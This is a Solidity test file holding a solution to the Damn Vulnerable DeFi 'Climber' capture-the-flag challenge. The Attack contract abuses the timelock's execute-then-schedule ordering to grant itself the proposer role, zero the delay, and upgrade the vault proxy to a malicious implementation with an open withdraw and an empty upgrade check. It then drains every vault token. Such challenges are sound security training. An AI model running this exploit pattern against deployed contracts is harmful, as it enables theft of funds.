// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

// steps to do :
// 1. update the delay.
// 2. update the operation state.
// 3. I have to make this contract proposer as well.
// 4. upgrade the vault with a withdraw function

contract UpgradedContract is UUPSUpgradeable {
    constructor() {
        _disableInitializers();
    }

    function withdraw(DamnValuableToken token, address recovery) external {
        uint256 balance = token.balanceOf(address(this));
        token.transfer(recovery, balance);
    }

    function _authorizeUpgrade(address newImplementation) internal override {}

    receive() external payable {}
}

contract Attack is Test {
    address[] public targets = new address[](4);
    uint256[] public values = new uint256[](4);
    bytes[] public data = new bytes[](4);
    bytes32 salt = bytes32("123");

    function attack(ClimberTimelock timelock, ClimberVault vault, DamnValuableToken token, address recovery) external {
        //create the targets;

        // new implementation
        UpgradedContract newImplementation = new UpgradedContract();

        // upgrade the contract first
        targets[0] = address(vault);
        values[0] = 0;
        data[0] = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(newImplementation), "");

        // update the delay
        targets[1] = address(timelock);
        values[1] = 0;
        data[1] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);

        // get the proposer role for the contract
        targets[2] = address(timelock);
        values[2] = 0;
        data[2] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));

        // get the proposer role for the contract
        targets[3] = address(this);
        values[3] = 0;
        data[3] = abi.encodeWithSignature("scheduleAction(address)", address(timelock));

        timelock.execute(targets, values, data, salt);

        UpgradedContract(payable(address(vault))).withdraw(token, recovery);

        // newImplementation.withdraw(token, recovery);
    }

    function scheduleAction(address timelock) external {
        bool IHaveRole = ClimberTimelock(payable(timelock)).hasRole(PROPOSER_ROLE, address(this));
        if (!IHaveRole) {
            revert("I don't have Role");
        }
        ClimberTimelock(payable(timelock)).schedule(targets, values, data, salt);
    }
}

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        Attack att = new Attack();
        att.attack(timelock, vault, token, recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
